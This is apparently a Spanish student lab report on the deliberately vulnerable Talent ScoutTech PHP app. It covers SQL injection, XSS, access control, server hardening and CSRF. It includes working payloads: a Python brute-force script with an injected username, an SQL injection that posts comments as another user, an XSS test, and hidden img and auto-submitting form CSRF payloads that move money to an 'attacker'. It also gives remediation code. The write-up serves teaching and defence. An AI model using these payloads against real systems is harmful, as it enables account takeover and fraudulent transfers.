PROYECTO 03: TALENT SCOUTTECH

Parte 1: Inyección SQL

a) Para ver si podía sacarle información a la base de datos sobre la consulta que estaba ejecutando, me fui directo a la página de "Insertar jugador". Lo primero que hice fue probar a enviar el formulario vacío, y luego probé metiendo una comilla simple ‘ en el usuario, dejando la contraseña en blanco. El resultado fue interesante: me dejó pasar (lo que ya nos dice que el control de acceso hace aguas), pero además escupió varios errores.

\!\[\]\[image1\]

Estos errores son oro puro. Primero, porque al romper la sintaxis sabemos seguro que no están usando sentencias preparadas. Segundo, la web se chiva de que esperaba recibir un objeto o un array de la base de datos, pero recibió un booleano (seguramente un false porque el usuario ‘ no existe). Luego intenta leer el nombre y equipo del jugador, y vuelve a fallar porque la base de datos no le ha dado nada.

Viendo esto, apuesto a que la consulta por detrás es algo así:

| Escribo los valores | “ ‘ ” |
| :---- | :---- |
| En el campo | usuario, dejando la contraseña vacía |
| Del formulario de la página | insert\_player.php |
| La consulta que se ejecuta es | SELECT \* FROM users WHERE username \= ‘ ’ |
| Los campos que se utilizan en la consulta son | user, password |
| Los campos que no se utilizan en la consulta son |  |

b) Sabiendo esto, el siguiente paso es intentar hacerme pasar por otro usuario usando un diccionario de contraseñas cortito. El problema es que no tengo ni idea de qué usuarios existen ni cómo se llaman, así que necesito un payload que "anule" la parte del nombre de usuario y se centre solo en la contraseña.

Para automatizar esto, me he montado un scriptillo en Python que va probando contraseñas del diccionario junto con la inyección SQL:

`import urllib.parse`

`import http.client`

`HOST = "localhost"`

`PATH = "/web/insert_player.php"`

`ERROR_TEXT = "invalid user or password"`

`passwords = [`

    `"password",`

    `"123456",`

    `"12345678",`

    `"1234",`

    `"qwerty",`

    `"dragon",`

`]`

`conn = http.client.HTTPConnection(HOST)`

`for pwd in passwords:`

    `injected_username = '" OR 1=1 LIMIT 1 OFFSET 1 -- -'`

    `body = urllib.parse.urlencode({`

        `"username": injected_username,`

        `"password": pwd`

    `})`

    `headers = {`

        `"Content-Type": "application/x-www-form-urlencoded",`

        `"Content-Length": str(len(body)),`

        `"Host": HOST,`

    `}`

    `conn.request("POST", PATH, body=body, headers=headers)`

    `resp = conn.getresponse()`

    `resp_body = resp.read().decode(errors="ignore")`

    `print(f"[+] Trying '{pwd}' -> status {resp.status}, len={len(resp_body)}")`

    `if ERROR_TEXT.lower() not in resp_body.lower():`

        `print(f"[!] POSSIBLE SUCCESS with password = '{pwd}'")`

        `break`

`conn.close()`

Al lanzarlo, ¡bingo\! Me devolvió esto:

\!\[\]\[image2\]

Así que ya tenemos una entrada válida: hay un usuario cuya contraseña es “1234”.

| Explicación del ataque | Un ataque de fuerza bruta sencilla haciendo peticiones POST con un script de python y el diccionario provisto. |
| :---- | :---- |
| Usuario con el que se accede | " OR 1=1 LIMIT 1 OFFSET 1 \-- \- |
| Contraseña con la que se accede | 1234 |

c) He estado mirando la función SQLite3::escapeString() y la verdad es que no sirve de mucho aquí; la aplicación sigue expuesta. El problema es de base por un par de cosas:

1. Mal uso de las comillas: La consulta original mete el nombre de usuario entre comillas dobles ("):  
   WHERE username \= "' . $user . '"'  
   Pero resulta que SQLite3::escapeString() está pensada para escapar comillas simples ('), que es lo estándar en SQL. Si yo le meto comillas dobles, la función ni se entera, me deja cerrar la cadena original y meter mi código SQL (OR 1=1...) tan a gusto.  
2. Concatenar es mala idea: Da igual la función de escape que uses, pegar variables directamente en la consulta SQL es buscarse problemas. Siempre se te puede escapar algún carácter raro. Lo suyo es usar sentencias preparadas y olvidarse de líos, porque ahí sí que separas datos de comandos de verdad.

d) Otra cosa que vi es que para publicar comentarios como si fuera otra persona, primero necesitaba el ID del jugador. Eso es fácil, se ve en la URL nada más entrar a sus comentarios:

[http://localhost/web/show\_comments.php?id=3](http://localhost/web/show_comments.php?id=3)

Me puse a cotillear el código de add\_comment.php y vi la consulta que guarda los comentarios:

INSERT INTO comments (playerId, userId, body) VALUES ('".$\_GET\['id'\]."', '".$\_COOKIE\['userId'\]."', '$body');

Aquí el fallo es garrafal: coge el parámetro id directamente de la URL (GET) y lo mete en la base de datos sin preguntar. Ni validación ni nada. Esto me permite inyectar SQL para cambiar no solo el ID del jugador, sino también el userId, que es quien supuestamente escribe el comentario.

Para confirmar esto, usé fuzzing y encontré una copia del archivo llamada add\_comment.php\~.

Básicamente, modificando el id en la URL puedo cerrar la consulta original y meter mis propios datos. Si quiero publicar un comentario haciéndome pasar por el usuario con ID 1 (que podría ser el admin), meto este payload:

3', '1', 'Es la leche') \-- \-  
La URL completa quedaría así: 

[http://localhost/web/add\\\_comment.php?id=3](http://localhost/web/add%5C_comment.php?id=3)

', '1', 'es la leche') \-- \-

| vulnerabilidad | Inyección SQL en el parámetro id al mandarlo por GET. |
| :---- | :---- |
| descripción del ataque | Se cambia el parámetro ID |
| cómo hacer segura esta sección: | Usar consultas preparadas. |

Parte 2: XSS

1\) Comprobar XSS en los comentarios

Para ver si podía colar código JavaScript (Cross Site Scripting), probé lo típico: meter un script en la caja de comentarios a ver si se ejecutaba.  
Escribí esto:

\<script\>alert('test xss');\</script\>  
\!\[\]\[image3\]

Y efectivamente, al volver a entrar en los comentarios de "Candela", saltó la ventanita:

\!\[\]\[image4\]

Esa alerta confirma el XSS. El navegador se come el código JS y lo ejecuta sin rechistar porque la aplicación no está filtrando nada de lo que entra.

| Introduzco el mensaje | \<script\>alert('test xss');\</script\> |
| :---- | :---- |
| En el formulario de la página | add\_comment.php |

Por cierto, mirando el código vi que los enlaces con varios parámetros GET tienen una pinta curiosa. Por ejemplo, el de donación.

2\) ¿Por qué usar \&amp; en vez de &?

Esto no es un fallo, es simplemente que HTML es así de especial. El símbolo & está reservado para empezar "entidades" (como \&lt; para poner un \<).

Si pones un & a pelo en un enlace (href="...?a=1\&b=2"), el navegador se puede liar e intentar interpretar lo que viene después como un código especial. Si no es un código válido, a veces rompe la URL o se ve mal.  
Por eso, para hacerlo bien según el estándar, hay que escribir \&amp;. El navegador ya sabe que eso significa un & normal y corriente y envía la URL bien al servidor.

| Campo | Respuesta |
| :---- | :---- |
| Explicación | El & se codifica como \&amp; para que el parser HTML no lo confunda con el inicio de una entidad especial. El navegador se encarga de decodificarlo automáticamente al hacer clic, enviando la URL correcta con & al servidor. |

c) El problema de show\_comments.php y cómo arreglarlo

Echando un ojo a show\_comments.php, vi que el problema es que saca los comentarios de la base de datos y los planta en la pantalla tal cual, sin limpiar nada.

Mira este trozo de código:  
$query \= "SELECT \* FROM comments WHERE playerId \= ".$\_GET\['id'\];  
$result \= $db-\>query($query);

while ($row \= $result-\>fetchArray()) {  
// VULNERABILIDAD: Se imprime el cuerpo del comentario directamente  
echo "Comment: " . $row\['body'\];  
}

La web se fía demasiado de lo que hay en la columna body. Como yo ya había guardado mi script malicioso antes, al llegar aquí, show\_comments.php lo imprime y el navegador lo ejecuta pensando que es código suyo. Eso es un XSS de manual.

La solución:  
Hay que tratar cualquier cosa que venga de la base de datos como "texto peligroso" antes de ponerlo en el HTML.  
En PHP tenemos htmlspecialchars(), que convierte los caracteres conflictivos (\<, \>, comillas) en su versión inofensiva de texto (\&lt;, etc.). Así se ve el código del script en pantalla, pero no se ejecuta.

El código seguro sería:

php

*`// Solución: Envolver la salida con htmlspecialchars`*

`echo "Comment: " . htmlspecialchars($row['body'], ENT_QUOTES, 'UTF-8');`

| Vulnerabilidad | Stored XSS (Cross-Site Scripting Almacenado) |
| :---- | :---- |
| Causa | Falta de sanitización de salida al imprimir variables de la base de datos. |
| Solución | Implementar htmlspecialchars($variable, ENT\_QUOTES, 'UTF-8') en todas las salidas de datos. |

d) No es el único sitio: también pasa en list\_players.php

Me puse a buscar si había más sitios con este problema, revisando todos los archivos PHP que pintan datos del usuario. Básicamente busqué cualquier echo que no tuviera el htmlspecialchars.

Y encontré otro en list\_players.php.

En este archivo se listan los jugadores y sus equipos, y pasa lo mismo: se imprimen los datos a pelo desde la base de datos.

echo "Name: " . $row\['name'\] . "\<br\>";  
echo "Team: " . $row\['team'\] . "\<br\>";

Esto es peligroso porque si consigo registrar un jugador con un nombre "trucado" (metiendo un script en el campo nombre), cualquiera que entre a ver la lista de jugadores se va a comer mi script.  
Así que el XSS no está solo en los comentarios. La solución es la misma: ponerle htmlspecialchars() a todo lo que salga en list\_players.php.

| Página adicional afectada | list\_players.php |
| :---- | :---- |
| Datos vulnerables | Campos 'name' y 'team' de los jugadores. |
| Método de descubrimiento | Revisión de código fuente (Source Code Review) buscando salidas de datos sin escapar. |

Parte 3: Control de acceso, autenticación y sesiones de usuarios

a) Asegurando el registro (register.php)

Tal y como está ahora, register.php es un coladero. Te deja crear usuarios sin comprobar nada, lo que invita a llenarlo de cuentas falsas, meter más inyecciones SQL o usar contraseñas ridículas.

Para adecentarlo un poco habría que hacer esto:

1. Validar lo que entra: No te puedes fiar de lo que manda el usuario. Hay que comprobar que el email parece un email de verdad (filter\_var) y que el nombre de usuario solo tiene letras y números. Y por supuesto, usar sentencias preparadas para guardar los datos, que ya hemos visto lo que pasa si no.  
2. Contraseñas serias: Nada de guardar contraseñas en texto plano. Hay que hashearlas con algo robusto como password\_hash() (Bcrypt o Argon2). Y obligar a que tengan una longitud mínima y caracteres variados para que no las revienten con fuerza bruta en dos minutos.  
3. Frenar a los bots: Si no ponemos un CAPTCHA, cualquier script puede crearnos mil usuarios en un segundo.  
4. Confirmar el email: Lo ideal sería enviar un correo con un link para activar la cuenta, así nos aseguramos de que el correo existe.

Como estamos en un entorno de pruebas y no tenemos servidor de correo, lo crítico que sí o sí hay que implementar ya es la validación y el hash de contraseñas:

php

*`// Ejemplo de implementación segura (simplificado)`*

`$username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_SPECIAL_CHARS);`

`$password = $_POST['password'];`

`if (strlen($password) < 8) {`

    `die("La contraseña debe tener al menos 8 caracteres.");`

`}`

*`// Hash seguro antes de guardar`*

`$passwordHash = password_hash($password, PASSWORD_DEFAULT);`

*`// Inserción segura con Prepared Statement`*

`$stmt = $db->prepare("INSERT INTO users (username, password, email) VALUES (:user, :pass, :email)");`

`$stmt->bindValue(':user', $username);`

`$stmt->bindValue(':pass', $passwordHash);`

*`// ... bind de email ...`*

`$stmt->execute();`

b) Arreglando el Login (auth.php)

El sistema de login actual da miedo. Guarda el usuario y la contraseña tal cual en las cookies.

Esto es lo que hay que cambiar:

1. Sesiones de verdad: Guardar credenciales en cookies ($\_COOKIE) es regalar la cuenta. Si alguien ve esa cookie, tiene la contraseña. Hay que usar sesiones de PHP ($\_SESSION). Así, en el navegador del usuario solo queda un ID de sesión (el famoso PHPSESSID) y los datos importantes se quedan seguros en el servidor.  
2. Fuerza bruta: Hay que poner un límite. Si alguien falla 5 veces seguidas, se le bloquea un rato.  
3. Cambiar el ID de sesión: Justo después de loguearse, hay que regenerar el ID de sesión (session\_regenerate\_id). Esto evita que alguien te "preste" una sesión fijada y luego se meta en tu cuenta.

Lo que hay que tocar en auth.php:

php

`session_start();`

*`// Al loguearse correctamente:`*

`$_SESSION['user_id'] = $user['id'];`

`$_SESSION['username'] = $user['username'];`

*`// Regenerar ID para seguridad`*

`session_regenerate_id(true);`

*`// Eliminar lógica de cookies inseguras`*

*`// setcookie('password', ...); // ELIMINAR ESTO`*

c) Quién entra a register.php

Ahora mismo register.php está abierto a todo el mundo. En una empresa como Talent ScoutTech esto no tiene sentido.

Lo suyo sería:

1. Solo admins: Poner un chequeo al principio del archivo. Si no eres admin, te manda al login.  
2. Por invitación: Si queremos que sea público pero controlado, podríamos usar tokens en la URL que solo un admin pueda generar.

Lo más rápido y efectivo ahora es poner la verificación de sesión:

php

`session_start();`

`if (!isset($_SESSION['user_id'])) {`

    `header("Location: index.php");`

    `exit();`

`}`

*`// Resto del código de registro...`*

d) Escondiendo la carpeta private

Se supone que la carpeta private es secreta, pero en una instalación normal de Apache, si entras a http://localhost/web/private/ y no hay un index.php, te lista todos los archivos que hay. Y te los puedes descargar.

Para blindar esto:

1. .htaccess al rescate: Crear un archivo .htaccess dentro de esa carpeta que diga Deny from all. Así, si intentas entrar por navegador te da error, pero los scripts de PHP pueden seguir usando esos archivos por dentro.  
2. Sacarla de ahí: Lo mejor sería mover esa carpeta fuera de donde publica la web (public\_html). Si no está en la carpeta pública, no hay URL que valga para llegar a ella.

La solución del .htaccess es muy fácil de aplicar:

text

`# Bloquear acceso web a todos los archivos`

`Order Deny,Allow`

`Deny from all`

e) El problema de la sesión actual

Ahora mismo la web se fía de la cookie userId. Si yo edito mis cookies en el navegador y me cambio ese número, la web se cree que soy otro usuario. Eso es un robo de sesión (Session Hijacking) de libro.

Para arreglarlo hay que pasar todo al lado del servidor:

1. Checkear sesión siempre: Tener un check\_session.php que verifique que la sesión es válida en cada página.  
2. Caducidad: Si el usuario se va a comer y deja la sesión abierta, que se cierre sola a los 30 minutos.  
3. Cookies blindadas: Configurar la cookie de sesión para que tenga HttpOnly (así JavaScript no puede leerla y nos protegemos un poco de XSS) y Secure (para que solo viaje por HTTPS).

php

*`// Configuración segura de cookies de sesión`*

`session_set_cookie_params([`

    `'lifetime' => 1800, // 30 minutos`

    `'path' => '/',`

    `'domain' => 'localhost',`

    `'secure' => true, // Solo HTTPS`

    `'httponly' => true, // No accesible por JS`

    `'samesite' => 'Strict'`

`]);`

`session_start();`

Parte 4 \- Servidores web

La seguridad no es solo código PHP; el servidor donde corre todo (Apache) también tiene que estar bien configurado. He revisado cómo está montado Talent ScoutTech y propongo estos cambios para endurecerlo (hardening).

a) No dar pistas (Security by Obscurity)

Por defecto, Apache es muy "bocazas" y le cuenta a todo el mundo su versión y el sistema operativo en las cabeceras o cuando da un error. Esa info le viene genial a un atacante para buscar fallos específicos de esa versión.

Hay que tocar el archivo de configuración de Apache y poner:

* ServerTokens Prod: Para que solo diga "Apache" y se calle la versión.  
* ServerSignature Off: Para que no firme los errores 404 con todos sus datos.

b) Que no se vean los archivos (Directory Listing)

Si entras a una carpeta sin index.php (como css/ o img/), Apache te lista todos los archivos. Eso queda feo y además da información de la estructura.

Se arregla fácil quitando el listado con Options \-Indexes en la configuración global o en el .htaccess.

text

`<Directory /var/www/html>`

    `Options -Indexes`

`</Directory>`

c) Cabeceras que protegen

Podemos decirle al navegador que se proteja solo enviando unas cabeceras extra:

* X-Frame-Options: SAMEORIGIN: Para que nadie pueda meter nuestra web en un \<iframe\> y hacernos clickjacking.  
* X-Content-Type-Options: nosniff: Para que el navegador no intente adivinar qué tipo de archivo es. Esto evita que alguien suba un .txt con código malicioso y el navegador lo ejecute como si fuera un script.  
* HSTS: Si usamos HTTPS (que deberíamos), esto obliga a que la conexión sea siempre segura.

d) Ajustando PHP (php.ini)

PHP también viene un poco "suelto" de fábrica. Hay que atarlo en corto en el php.ini:

* expose\_php \= Off: Para no ir gritando "¡Uso PHP versión X\!".  
* display\_errors \= Off: En producción, los errores se guardan en un log, nunca se muestran en pantalla. Ya vimos antes que los errores de SQL nos daban muchas pistas.  
* disable\_functions: Desactivar funciones peligrosas como exec o system si no las usamos, para que si alguien entra no lo tenga tan fácil para ejecutar comandos del sistema.

e) Ojo con los backups

Como vimos antes, dejarse archivos .php\~ o .bak es un peligro.  
Podemos decirle a Apache que bloquee directamente el acceso a cualquier archivo que termine en estas extensiones, por si a algún desarrollador se le olvida borrarlo.

text

`<FilesMatch "(\.(bak|config|sql|ini|log|sh|inc|swp)|~)$">`

    `Order allow,deny`

    `Deny from all`

    `Satisfy All`

`</FilesMatch>`

| Versión de Apache | ServerTokens Prod / ServerSignature Off | Oculta versiones vulnerables a atacantes. |
| :---- | :---- | :---- |
| Listado de Archivos | Options \-Indexes | Evita la exposición de la estructura y archivos sensibles. |
| Cabeceras HTTP | X-Frame-Options, X-Content-Type | Mitiga Clickjacking y MIME-sniffing. |
| Configuración PHP | expose\_php \= Off, display\_errors \= Off | Reduce la fuga de información técnica y errores. |
| Archivos Ocultos | Bloqueo por extensión (.bak, \~) | Previene la descarga de código fuente y backups. |

Parte 5 \- Cross-Site Request Forgery (CSRF)

a) La trampa del botón "Profile"

Para ver si podía engañar a un usuario para que donara dinero sin querer, modifiqué list\_players.php. Añadí un botón que parece inofensivo ("Profile") pero que en realidad lanza la petición de donación.

xml

*`<!-- Botón malicioso disfrazado -->`*

`<a href="http://web.pagos/donate.php?amount=100&receiver=attacker" class="button">`

    `Profile`

`</a>`

Ahora, debajo de cada jugador sale ese botón. Si un usuario pica pensando que va a ver el perfil, su navegador manda la petición al servidor de pagos. Y si tiene la sesión abierta allí... ¡adiós a 100€\!

b) El ataque fantasma (XSS \+ CSRF)

El botón funciona, pero requiere que la víctima haga clic. Para hacerlo más letal, lo combiné con el XSS que encontré en los comentarios.  
La idea es que la petición se haga sola nada más cargar la página, sin tocar nada.

Puse este comentario:

xml

`¡Gran jugador!`

`<img src="http://web.pagos/donate.php?amount=100&receiver=attacker"`

     `width="0" height="0" style="display:none;" />`

¿El truco? La etiqueta \<img\> intenta cargar una imagen desde esa URL. Al navegador le da igual que sea una imagen o no, él hace la petición GET. Como le puse tamaño cero y oculto, la víctima no ve nada raro, pero la donación se ejecuta por detrás usando sus cookies.

c) ¿Cuándo funciona esto?

Para que este ataque triunfe se tienen que alinear los astros (pero pasa más de lo que creemos):

1. Sesión abierta: La víctima tiene que estar logueada en la web de pagos en ese momento.  
2. Sin protección: La web de pagos no comprueba de dónde viene la petición (no usa tokens Anti-CSRF ni mira el Referer). Se fía solo de que la cookie sea válida.  
3. Mismo navegador: Obviamente, tiene que abrir mi comentario malicioso en el mismo navegador donde tiene la sesión del banco.

d) ¿Y si cambian a POST?

Si la web de pagos se pone estricta y solo acepta peticiones POST, mi truco de la etiqueta \<img\> deja de funcionar, porque eso siempre es GET.  
¿Están a salvo? Pues no. Solo me obligan a cambiar de táctica.

Puedo inyectar un formulario oculto y usar un poco de JavaScript para enviarlo solo:

xml

`<form id="csrf_form" action="http://web.pagos/donate.php" method="POST">`

    `<input type="hidden" name="amount" value="100">`

    `<input type="hidden" name="receiver" value="attacker">`

`</form>`

`<script>`

    `document.getElementById('csrf_form').submit();`

`</script>`

Esto hace exactamente lo mismo: crea una petición POST válida y la envía en nombre del usuario sin que él haga nada. Así que cambiar a POST no arregla el CSRF.

| GET | Enlace \<a\> (Botón Profile) | Requiere Clic |
| :---- | :---- | :---- |
| GET | Etiqueta \<img\> | Cero Interacción (Automático al cargar) |
| POST | Formulario oculto \+ JS | Cero Interacción (Automático al cargar) |

